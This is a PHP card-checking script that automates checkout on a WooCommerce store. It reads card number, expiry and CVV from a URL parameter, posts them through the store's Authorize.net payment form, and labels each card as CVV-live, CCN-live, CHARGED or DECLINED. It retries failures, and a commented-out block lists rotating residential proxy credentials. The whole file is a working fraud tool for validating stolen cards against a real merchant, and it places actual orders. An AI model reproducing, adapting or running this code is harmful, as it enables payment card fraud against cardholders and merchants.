<?php

require "z.php";


function multiexplode($delimiters, $string)
{
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv1 = multiexplode(array(":", "|", ""), $lista)[3];


if (strlen($ano) == 4) {
    $ano = substr($ano, 2); // Return the last two digits
}


$startTime = microtime(true);
$retries = 0;
retry:

/*$proxylist = [
    '64ef46a15276b-res-US-sid-524381:Pwd64ef46a15276b',
    '64ef46a15276b-res-US-sid-320587:Pwd64ef46a15276b',
    '64ef46a15276b-res-US-sid-108964:Pwd64ef46a15276b',
    '64ef46a15276b-res-US-sid-615908:Pwd64ef46a15276b',
    '64ef46a15276b-res-US-sid-540128:Pwd64ef46a15276b',
    '64ef46a15276b-res---sid-840163:Pwd64ef46a15276b',
    '64ef46a15276b-res---sid-257348:Pwd64ef46a15276b',
    '64ef46a15276b-res---sid-534617:Pwd64ef46a15276b',
    '64ef46a15276b-res---sid-257801:Pwd64ef46a15276b',
    '64ef46a15276b-res---sid-420138:Pwd64ef46a15276b',
    '64ef46a15276b-res---sid-631947:Pwd64ef46a15276b',
    '64ef46a15276b-res---sid-764019:Pwd64ef46a15276b',
    '64ef46a15276b-res---sid-302761:Pwd64ef46a15276b',
    '64ef46a15276b-res---sid-589462:Pwd64ef46a15276b',
    '64ef46a15276b-res---sid-874693:Pwd64ef46a15276b',
    '64ef46a15276b-res---sid-871230:Pwd64ef46a15276b',
    '64ef46a15276b-res---sid-915236:Pwd64ef46a15276b',
    '64ef46a15276b-res---sid-126348:Pwd64ef46a15276b',
    '64ef46a15276b-res---sid-132409:Pwd64ef46a15276b',
    '64ef46a15276b-res---sid-892153:Pwd64ef46a15276b',
    '64ef46a15276b-res---sid-052487:Pwd64ef46a15276b',
    '64ef46a15276b-res---sid-904836:Pwd64ef46a15276b',
    '64ef46a15276b-res---sid-057682:Pwd64ef46a15276b',
    '64ef46a15276b-res---sid-732961:Pwd64ef46a15276b',
    '64ef46a15276b-res---sid-980736:Pwd64ef46a15276b',
    '64ef46a15276b-res---sid-675012:Pwd64ef46a15276b',
    '64ef46a15276b-res---sid-519073:Pwd64ef46a15276b',
    '64ef46a15276b-res---sid-079342:Pwd64ef46a15276b',
    '64ef46a15276b-res---sid-347102:Pwd64ef46a15276b',
    '64ef46a15276b-res---sid-380412:Pwd64ef46a15276b',
    '64ef46a15276b-res---sid-741205:Pwd64ef46a15276b',
    '64ef46a15276b-res---sid-065927:Pwd64ef46a15276b',
    '64ef46a15276b-res---sid-732598:Pwd64ef46a15276b',
    '64ef46a15276b-res---sid-762590:Pwd64ef46a15276b',
    '64ef46a15276b-res---sid-238461:Pwd64ef46a15276b',
    '64ef46a15276b-res---sid-607395:Pwd64ef46a15276b',
    '64ef46a15276b-res---sid-623508:Pwd64ef46a15276b',
    '64ef46a15276b-res---sid-072568:Pwd64ef46a15276b',
    '64ef46a15276b-res---sid-657894:Pwd64ef46a15276b',
    '64ef46a15276b-res---sid-093476:Pwd64ef46a15276b',
    '64ef46a15276b-res---sid-179856:Pwd64ef46a15276b',
    '64ef46a15276b-res---sid-248650:Pwd64ef46a15276b',
    '64ef46a15276b-res---sid-678910:Pwd64ef46a15276b',
    '64ef46a15276b-res---sid-326871:Pwd64ef46a15276b',
    '64ef46a15276b-res---sid-063592:Pwd64ef46a15276b',
    '64ef46a15276b-res---sid-068932:Pwd64ef46a15276b',
    '64ef46a15276b-res---sid-847120:Pwd64ef46a15276b',
    '64ef46a15276b-res---sid-107539:Pwd64ef46a15276b',
    '64ef46a15276b-res---sid-684250:Pwd64ef46a15276b',
    '64ef46a15276b-res---sid-051278:Pwd64ef46a15276b',
    '64ef46a15276b-res---sid-719026:Pwd64ef46a15276b',
    '64ef46a15276b-res---sid-476258:Pwd64ef46a15276b',
    '64ef46a15276b-res-US-sid-743210:Pwd64ef46a15276b',


];
//$proxy = 'a.proxy-jet.io:1010';
//$proxyUserPass = $proxylist[array_rand($proxylist)];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api64.ipify.org?format=json'); // Using ipify API to detect IP
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');

$headers = array(
    'user-agent: YourUserAgentHere',
    'connection: keep-alive'
);


curl_setopt_array($ch, array(
    CURLOPT_PROXY => $proxy,
    CURLOPT_PROXYUSERPWD => $proxyUserPass,
    CURLOPT_PROXYAUTH => CURLAUTH_ANY, // Allow cURL to use any available proxy authentication method
    CURLOPT_HTTPHEADER => $headers,
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_SSL_VERIFYPEER => 0,
    CURLOPT_SSL_VERIFYHOST => 0
));

$response = curl_exec($ch);

if (curl_errno($ch)) {
    curl_error($ch);
} else {
    $data = json_decode($response, true);
}

if (isset($response)){
    $ip = "✅";
}
if (empty($response)){
    $ip = "❌";
}
    */

#ADD TO CART
//1st Curl
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://slicespark.com/product/5-kitchen-knives-set-cooking-knives/');
curl_setopt($ch, CURLOPT_POST, 1);

$postfield = '------WebKitFormBoundaryUf1ap35wAOxbi4as
Content-Disposition: form-data; name="quantity"

1
------WebKitFormBoundaryUf1ap35wAOxbi4as
Content-Disposition: form-data; name="add-to-cart"

147
------WebKitFormBoundaryUf1ap35wAOxbi4as--
';

$headers = array();
$headers[] = 'authority: slicespark.com';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
$headers[] = 'content-type: multipart/form-data; boundary=----WebKitFormBoundaryUf1ap35wAOxbi4as';
$headers[] = 'origin: https://slicespark.com';
$headers[] = 'referer: https://slicespark.com/product/5-kitchen-knives-set-cooking-knives/';
$headers[] = 'user-agent: '.$ua.'';
#$headers[] = 'connection: keep-alive';
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cx, CURLOPT_COOKIEJAR => $cx]);
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_POSTFIELDS => $postfield));

$b = curl_exec($ch);



# CHECKOUT

//2nd Curl
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://slicespark.com/checkout/');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');

$headers = array();
$headers[] = 'authority: slicespark.com';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
$headers[] = 'referer: https://slicespark.com/product/5-kitchen-knives-set-cooking-knives/';
$headers[] = 'user-agent: '.$ua.'';
#$headers[] = 'connection: keep-alive';
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cx, CURLOPT_COOKIEJAR => $cx]);
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0));

$d = curl_exec($ch);
$n = trim(strip_tags(v($d, '<input type="hidden" id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="','" />')));
$cn = v($d ,'"client_token_nonce":"','"');
//echo 'Nonce: '.$n.'<br>';
//echo 'cn: '.$cn.'<br>';

//3rd Curl

$y = curl_exec($ch);
$client_token = v($y, '"data":"','="');
$decodedToken = base64_decode($client_token);
$tokenData = json_decode($decodedToken, true);
$bearer = $tokenData['authorizationFingerprint'];

//echo htmlentities($d);
//echo 'client_token: '.$client_token.'<br>';
//echo 'Bearer: '.$bearer.'<br>';

//4th Curl

$a = curl_exec($ch);
$ro1 = json_decode($a);
//$token = $ro1->data->tokenizeCreditCard->token;

//echo 'Token: '.$token.'<br>';
//echo $a.'<br>';


//5th curl
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://slicespark.com/checkout/');
curl_setopt($ch, CURLOPT_POST, 1);

$postfield = 'billing_first_name=shawnpoll&billing_last_name=shawnpoll&billing_company=sawhn&billing_country=US&billing_address_1=2510+NE+VIVION+RD&billing_address_2=34&billing_city=KANSAS+CITY&billing_state=MO&billing_postcode=64118&billing_phone=0912+063+95423&billing_email=jhefvrix%40gmail.com&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=US&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=CA&shipping_postcode=&order_comments=&shipping_method%5B0%5D=usps_simple%3AFIRST_CLASS&payment_method=authnet&authnet-card-number='.$cc.'&authnet-card-expiry='.$mes.'+%2F+'.$ano.'&authnet-card-cvc='.$cvv1.'&woocommerce-process-checkout-nonce='.$n.'&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review';


$headers = array();
$headers[] = 'authority: fpfootwear.com';
$headers[] = 'accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'content-type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'origin: https://fpfootwear.com';
$headers[] = 'referer: https://fpfootwear.com/checkout/';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'x-requested-with: XMLHttpRequest';
$headers[] = 'user-agent: '.$ua.'';
$headers[] = 'connection: keep-alive';
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cx, CURLOPT_COOKIEJAR => $cx]);
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_POSTFIELDS => $postfield));

$e = curl_exec($ch);
$ro2 = json_decode($e, true);;
$result = $ro2['result'];
$message = trim(strip_tags($ro2['messages']));
$url = $ro2['redirect'];
$od = $ro2['order_id'];

$endTime = microtime(true);
$overallTime = $endTime - $startTime;
//echo $e;
//echo '<br>Result: '.$result.'  Message Reason: '.$messageReason;


if(strpos($message, 'Gateway Rejected: avs') !== false){
    echo '<div style="margin-bottom: 8px;"><div style="background-color: green; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [#CVV] </div> <div style="background-color: #b8731a; padding: 3px; display: inline-block; color: white; border-radius: 3px;">'. $lista .'</div> <div style="background-color: #2b1675; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ '.$ls.' ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ T: '.number_format($overallTime, 2).'s ] </div> <div style="background-color: #3788fa; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ IP: '.$ip.''.$data['ip'].' ] </div><br></div>';
}
else if(strpos($message, 'The card verification number does not match') !== false){
    echo '<div style="margin-bottom: 8px;"><div style="background-color: green; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [#CCN] </div> <div style="background-color: #b8731a; padding: 3px; display: inline-block; color: white; border-radius: 3px;">'. $lista .'</div> <div style="background-color: #2b1675; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ '.$message.' ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ T: '.number_format($overallTime, 2).'s ] </div> <div style="background-color: #3788fa; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ IP: '.$ip.''.$data['ip'].' ] </div><br></div>';
}
else if ($result === 'success'){ 
    echo '<div style="margin-bottom: 8px;"><div style="background-color: green; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [#CHARGED] </div> <div style="background-color: #b8731a; padding: 3px; display: inline-block; color: white; border-radius: 3px;">'. $lista .'</div> <div style="background-color: #2b1675; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ Order Placed ID: '.$od.' ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ Auth + Woo ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ T: '.number_format($overallTime, 2).'s ] </div> <div style="background-color: #3788fa; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ IP: '.$ip.''.$data['ip'].' ] </div><br></div>';
}
else if(strpos($message, 'Insufficient funds in account') !== false){
    echo '<div style="margin-bottom: 8px;"><div style="background-color: green; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [#CVV] </div> <div style="background-color: #b8731a; padding: 3px; display: inline-block; color: white; border-radius: 3px;">'. $lista .'</div> <div style="background-color: #2b1675; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ '.$message.' ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [T: '.number_format($overallTime, 2).'s] </div> <div style="background-color: #3788fa; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ IP: '.$ip.''.$data['ip'].' ] </div><br></div>';
}
else if($message === 'Call Issuer. Pick Up Card.'){
    echo '<div style="margin-bottom: 8px;"><div style="background-color: red; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [DECLINED] </div> <div style="background-color: #b8731a; padding: 3px; display: inline-block; color: white; border-radius: 3px;">'. $lista .'</div> <div style="background-color: #2b1675; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ Call Issuer. Pick Up Card. ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ T: '.number_format($overallTime, 2).'s ] </div> <div style="background-color: #3788fa; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ IP: '.$ip.''.$data['ip'].' ] </div><br></div>';
}
else if($message === 'Payment instrument type is not accepted by this merchant account.'){
    echo '<div style="margin-bottom: 8px;"><div style="background-color: red; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [DECLINED] </div> <div style="background-color: #b8731a; padding: 3px; display: inline-block; color: white; border-radius: 3px;">'. $lista .'</div> <div style="background-color: #2b1675; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ Payment instrument type is not accepted by this merchant account. ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ T: '.number_format($overallTime, 2).'s ] </div> <div style="background-color: #3788fa; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ IP: '.$ip.''.$data['ip'].' ] </div><br></div>';
}
else if (empty($e)) {
  goto retry;
}
else if (strpos($e, 'We were unable to process your order')) {
  goto retry;
}   
else{
    echo '<div style="margin-bottom: 8px;"><div style="background-color: red; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [DECLINED] </div> <div style="background-color: #b8731a; padding: 3px; display: inline-block; color: white; border-radius: 3px;">'. $lista .'</div> <div style="background-color: #2b1675; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ '.$message.' ] </div> <div style="background-color: #424145; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ T: '.number_format($overallTime, 2).'s ] </div> <div style="background-color: #3788fa; padding: 3px; display: inline-block; color: white; border-radius: 3px;"> [ IP: '.$ip.''.$data['ip'].' ] </div><br></div>';
}
curl_close($ch);
ob_flush();
unlink($cx);
?>